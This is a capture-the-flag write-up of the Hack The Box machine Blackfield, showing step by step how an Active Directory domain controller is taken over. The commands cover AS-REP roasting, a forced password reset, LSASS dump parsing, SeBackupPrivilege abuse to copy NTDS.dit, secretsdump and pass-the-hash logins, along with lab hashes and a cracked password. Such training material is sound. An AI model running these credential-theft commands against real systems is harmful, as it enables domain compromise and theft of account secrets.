# :game_die: Hack the Box — Blackfield

---

# Hack the Box — Blackfield

*[https://www.hackthebox.eu/home/machines/profile/255](https://www.hackthebox.eu/home/machines/profile/255)*

Blackfield is a 40-point machine from Hack the Box which requires you to exploit mistakes done after a recent computer forensic investigation recently done on the machine. The files left valuable information about the machine, usually extracted when doing computer forensics, which includes a dump of LSASS. Gaining access to system dumps would have been meaningless if all passwords were changed, but it was not. To get system on the machine, I abuse the SEBackupPrivilege to get a copy of NTDS.dit and parse it to get Administrator hashes.

## To summarize the steps taken to solve the box:

Initial foothold:

- Identify valid domain users

- AS-REP Roasting

- Force change a user’s password

audit2020 → svc_backup:

- Extract password from dump file

svc_backup →Administrator:

- Abuse backup privilege to extract NTDS.DIT and system hive

- Extract domain hashes using `secretsdump`

## Scanning:

I first start with `masscan`to identify open ports in the machine:

```
sudo masscan -p1-65535,U:1-65535 10.10.10.192 --rate=1000 -e tun0
```

The results are the following:

```
Discovered open port 389/tcp on 10.10.10.192 Discovered open port 53/udp on 10.10.10.192 Discovered open port 445/tcp on 10.10.10.192 Discovered open port 5985/tcp on 10.10.10.192 Discovered open port 53/tcp on 10.10.10.192 Discovered open port 593/tcp on 10.10.10.192 Discovered open port 135/tcp on 10.10.10.192 Discovered open port 3268/tcp on 10.10.10.192 Discovered open port 88/tcp on 10.10.10.192
```

Based on the open ports, I am most likely dealing with a domain controller. I can then save its output on a file, and parse to get only the port numbers:

```
sif0@kali:~/htb/boxes/Blackfield-10.10.10.192$ cat masscan.out |cut -d "/" -f 1 | cut -d " " -f 4 | paste -s -d, - 389,53,445,5985,53,593,135,3268,88
```

I then run `Nmap`to learn more information on the open ports:

```
sif0@kali:~/htb/boxes/Blackfield-10.10.10.192$ mkdir nmap; sudo nmap -sV -sC 10.10.10.192 -oA nmap/blackfield -vv -n -p 389,53,445,5985,593,135,3268,88
```

Not much information on the results of `Nmap`. No vulnerabilities right of the bat. I then used `ldapsearch` to get more domain-related information. To summarize:

```
DOMAIN: Blackfield
FQDN: Blackfield.local
DC: DC01.blackfield.local
```

### SMB Enumeration

I try to enumerate if there are interesting SMB shares:

Non-default shares here are “forensic”and “profile$”. I then proceed to check what is under the forensic share, but do not have enough permissions. Checking the other share:

Seeing that it might be potential usernames since it follows the format of *F.LastName* which is a common way of creating usernames in Active Directory, I placed the names on a single file to identify if all of these usernames are valid.

### Username Enumeration using Kerberos

I can enumerate valid usernames using `[Kerbrute](https://github.com/ropnop/kerbrute)`which basically abuses how Kerberos responds to identify if the user is valid.

```
kerbrute_linux_386 userenum --dc 10.10.10.192 -d blackfield.local users.txt --safe -v
```

Eventually, there are only 3 valid usernames out of 314.

Alternatively, I can use an auxiliary module from `Metasploit` to do the same:

```
msf5 auxiliary(gather/kerberos_enumusers) >
```

This would give you the same results, but `Kerbrute` is much more stable(or Impacket’s GetNPUsers.py).

So there are only 3 valid users:

```
audit2020
svc_backup
support
```

### AS-REP Roasting

I then checked if any of these users are vulnerable to AS-REP Roasting, which I already discussed in my Forest writeup. I used `Impacket’s `GetNPUsers.py:

```
GetNPUsers.py blackfield.local/ -usersfile real-users.txt -dc-ip 10.10.10.192
```

Since the user `support` is vulnerable, the DC gives us a TGS which we can try to crack to get its plaintext password.

```
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$support@BLACKFIELD.LOCAL:e6dfe911ddb2bd2631db466196100954$360cd4940e6f7b574aa0a1cadde4a74dd1320b85cd9d043c14260c62558fc409a4b0015132514b3e5aca159bed53c2716ac70da1abc8b8657d959450ad1e69eca2d51209157c977183b1b0465545f9f5dc3a70d00c0c2f713010a5fcba856615f671896f181709a581273c4f85214205ca84760a4650eebd545b62d7562a8a62c2f39d3a502a4411390df2f7cc5abe997fa06e384500925d5486bbba4aa5c4279d28560905434d99d30ba70dec2b237302ac3d32cfca19e9065a6a0544d9be93c6c034820293557679531fcbd2cebdef926630833716e4b658a43b573bd4d018c53d7083213f6c45f524ab327163f71bb05e6277 [-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Using `hashcat`, it cracks:

```
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt ..<snip>..$krb5asrep$23$support@BLACKFIELD.LOCAL:e6dfe911ddb2bd2631db466196100954$360cd4940e6f7b574aa0a1cadde4a74dd1320b85cd9d043c14260c62558fc409a4b0015132514b3e5aca159bed53c2716ac70da1abc8b8657d959450ad1e69eca2d51209157c977183b1b0465545f9f5dc3a70d00c0c2f713010a5fcba856615f671896f181709a581273c4f85214205ca84760a4650eebd545b62d7562a8a62c2f39d3a502a4411390df2f7cc5abe997fa06e384500925d5486bbba4aa5c4279d28560905434d99d30ba70dec2b237302ac3d32cfca19e9065a6a0544d9be93c6c034820293557679531fcbd2cebdef926630833716e4b658a43b573bd4d018c53d7083213f6c45f524ab327163f71bb05e6277:#00^BlackKnight
```

Now that I have a password for the user `support`, I know have 1 valid domain credential. In Active Directory environments, having access to one valid credential allows you to enumerate and gather tons of information about the domain. I used `ldapsearch` to enumerate further.

```
ldapsearch -x -h 10.10.10.192 -D 'BLACKFIELD\support' -w '#00^BlackKnight' -b "DC=BLACKFIELD,DC=LOCAL"
```

I did not include the output here for brevity but just wanted to show how you can enumerate using `ldapsearch`. The reason is that there are attributes that can easily be seen when investigated using `ldapsearch`, which `ldapdomaindump `doesn’t include in its output. The advantage of using `ldapdomaindump `is its easy on the eyes. To make things easier, I use `ldapdomaindump `to gather information about the domain:

```
ldapdomaindump ldap://10.10.10.192 -u "BLACKFIELD\support" -p "#00^BlackKnight" --no-json --no-grep -o ldapdomaindump[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

Investigating the domain_users.html file, there is a mention of the machine creator(kudos, this box is great) and information about the `svc_backup `user being a member of the `Remote Management Users` which means that user can use PowerShell Remoting to execute commands on the machine.

Checking information on the other 2 valid users, we can see that `DONT_REQ_PREAUTH `is set on the `support `user, hence the reason why it is vulnerable to AS-REP Roasting.

Also, since I have a valid domain user, I can run `Bloodhound `to learn more about the domain. Since I don’t have code execution yet on the machine, I can’t use the SharpHound ingestor(since I am not on a domain-joined Windows machine, but is still possible I think if you let your Linux box talk Kerberos) but there is a Python3-based ingestor, which would be enough.

```
bloodhound-python -u support -p "#00^BlackKnight" -ns 10.10.10.192 -d blackfield.local -c all
```

Loading the data on the Bloodhound GUI, it seems that the `support `user can force the password change of the user audit2020. This control of a user over another user is very common since helpdesk or support roles have the ability to reset a user’s password(since users often forget their passwords).

Clicking on help:

```
The user SUPPORT[@BLACKFIELD](http://twitter.com/BLACKFIELD).LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.
```

Also, the `svc_backup `user is a member of the `[Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)` group which is a privileged group that can be abused to grab a copy of the NTDS.dit (where domain hashes are stored) file.

So from here, I can say that this might be the privilege escalation needed to get to Administrator.

Force Password Reset Using Support User

Since the abuse info on `Bloodhound `requires Powershell and some form of code execution on any of the domain-joined machine, I searched for other ways to do this from a Linux machine and came across this resource: [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)

From the blog itself, I can reset the password using `rpcclient`. To connect:

```
rpcclient -U support 10.10.10.192
```

After entering the password, I did the following:

I get access_denied on changing the password of `svc_backup`, but suceed in changing `audit2020`’s password to ‘password123!’.

## Get sif0’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

I then use `crackmapexec`to verify if the credentials work over smb:

```
cme smb 10.10.10.192 -u audit2020 -p 'password123!' -d blackfield.local
```

It works, and I now have READ access on the forensic share(which the user `support `doesn’t have).

### Extracing to Credentials from LSASS dump

I then use `smbclient`to enumerate the folders under the forensic share:

Seeing that there might be interesting files here, I tried downloading them.

```
smbclient "\\\\10.10.10.192\\forensic" -c "prompt;recurse;mget *" -U=audit2020Enter WORKGROUP\audit2020's password:
getting file \commands_output\domain_admins.txt of size 528 as domain_admins.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec) getting file \commands_output\domain_groups.txt of size 962 as domain_groups.txt (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec) getting file \commands_output\domain_users.txt of size 16454 as domain_users.txt (16.9 KiloBytes/sec) (average 5.1 KiloBytes/sec)..<snip>..
```

I think these files are output of certain Volatility modules or commands but don’t take my word on it. I then tried reading one of the files, but interestingly it is detected as a binary file.

Then I remembered that PowerShell uses UTF-16 as its encoding, and doesn’t match with Linux. So maybe these files were from a PowerShell script? Moving forward, it can be read using using `iconv`

```
iconv -f utf-16 -t utf-8 domain_admins.txt
```

The output would be:

These credentials don’t work. These files are from the computer forensic analysis. This shows that the `Administrator `user was compromised and its password was changed to that. Remember that these files are from a computer forensic investigation, so these files are from a previous state of the machine. There are interesting files on the forensic share. One interesting file is the `lsass.zip` file, which most likely contains a dump of the `lsass.exe` process when the extraction was done. When I tried to download it, I encountered some issues:

I then tried various options that are easily searchable, but was able to make it work using `smbget`, which is like `wget`for smb:

```
smbget smb://10.10.10.192/forensic/memory_analysis/lsass.zip -U=audit2020%password123\!
```

Checking the contents of `lsass.zip` using 7z:

It does contain a file called `lsass.DMP`.

I then use `[pypykatz](https://github.com/skelsec/pypykatz)`to parse the dump file:

```
pypykatz lsa minidump /home/sif0/htb/boxes/Blackfield-10.10.10.192/forensic-share/lsass.DMP
```

Off the bat, I get a hash for `svc_backup`:

There is also a hash for the `Administrator `user, but this most likely not working anymore:

Since `svc_backup `is part of `Remote Management Users`, I try the hash gathered to use PowerShell Remoting thru `Evil-WinRM`:

```
evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
```

I am able to login.

I then check if I already have access to user.txt, and it looks like I do.

### svc_backup -> Administrator

I then check for interesting files under the C:\users\ directory:

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> gci C:\users\ -recurse -force -depth 3
```

It is interesting that I have access to the folders under `C:\Users\Administrator`:

Also, it seems that the `C:\Users\Administrator\Documents\forensic` is mounted as the `forensic` share from SMB. Also, there is a watcher.ps1 file. I do not have the privileges to read it though, but I’ll check on it later after.

I tried reading root.txt, but get permission denied:

I also tried to copy notes.txt, but get access denied:

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> copy c:\users\administrator\desktop\notes.txt .
Access to the path 'C:\users\administrator\desktop\notes.txt' is denied.
At line:1 char:1
+ copy c:\users\administrator\desktop\notes.txt .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : PermissionDenied: (C:\users\administrator\desktop\notes.txt:FileInfo) [Copy-Item], UnauthorizedAccessException
+ FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
```

Then I remember that the `svc_backup`user is a member of the `Backup Operators` group which most likely has the `SEBackupPrivilege `enabled. I verify it using` whoami /priv` :

### Abusing SEBackupPrivilege

I have done this abuse previously in the Multimaster machine, so this is not something new to me. This can be done by creating a shadow copy of NTDS.dit using the signed binary `diskshadow`. First, create a text file called script.txt which contains the following:

```
{
set context persistent nowriters
set metadata c:\windows\system32\spool\drivers\color\example.cab
set verbose on
begin backup
add volume c: alias mydrive

create

expose %mydrive% w:
end backup
}
```

Then execute the `diskshadow `and using the script file as its inputs.

```
diskshadow /s script.txt
```

I then use this [repo](https://github.com/giuliano108/SeBackupPrivilege)to copy the created shadow copy of NTDS.dit, then just follow the steps in the repo. Since I am using `Evil-WinRM`, I can just use its upload functionality:

```
upload SeBackupPrivilegeCmdLets.dll c:\users\svc_backup\music\
upload SeBackupPrivilegeUtils.dll c:\users\svc_backup\music\
```

I can then import the 2 files:

To test if everything’s working correctly, I first try to transfer notes.txt:

```
copy-filesebackupprivilege C:\users\administrator\desktop\notes.txt .\notes.txt -overwrite
```

Reading its contents:

```
Mates, After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditor's account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO. We will probably have to backup & restore things later. - Mike. PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```

From the notes, they weren’t done disabling the audti2020 account(which lead to the access to the forensic share).

Trying to copy root.txt:

```
*Evil-WinRM* PS C:\Users\svc_backup\music> copy-filesebackupprivilege C:\users\administrator\desktop\root.txt .\root.txt -overwrite Opening input file. - Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)) At line:1 char:1 + copy-filesebackupprivilege C:\users\administrator\desktop\root.txt .\ ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege
```

Still can’t copy root.txt since its is encrypted and I think can only be read on the Desktop. Proceeding with the `SEBackupPrivilege `abuse, I still need to transfer NTDS.dit and also need to dump the SYSTEM hive.

```
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\users\svc_backup\music\ntds.dit -Overwrite
C:\Users\svc_backup\music> reg save HKLM\SYSTEM c:\users\svc_backup\music\system.hive
The operation completed successfully.
```

I can the now download NTDS.dit and the system.hive files using `Evil-WinRM’s` download feature. Then, use `Impacket’s` secretsdump.py to parse NTDS.dit:

```
secretsdump.py LOCAL -system system.hive -ntds ntds.dit -outputfile secretsdump.out
```

I then get the hashes:

I can now utilize PowerShell Remoting to login as the `Administrator`user, and read root.txt:

```
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

Or use `crackmapexec `to do code execution:

```
cme smb 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee -d blackfield.local -x "whoami"
```

Checking also the watcher.ps1 script:

The script runs every 30 seconds, using Start-Sleep(sleep is just an alias) and encrypts root.txt thru PowerShell Remoting.

### Lessons learned

- Disable do not require pre-auth in Kerberos(led to the access to `support `user)

- Disable accounts that have been used for computer forensic/auditing(led to the existence of the user account `audit2020`)

- After being compromised and with knowledge that all domain credentials are exposed, change passwords for ALL user accounts especially highly privileged accounts(led access to `svc_backup `user)

This concludes my write-up. I hope you learned something new! Thanks for reading! 🍺

---
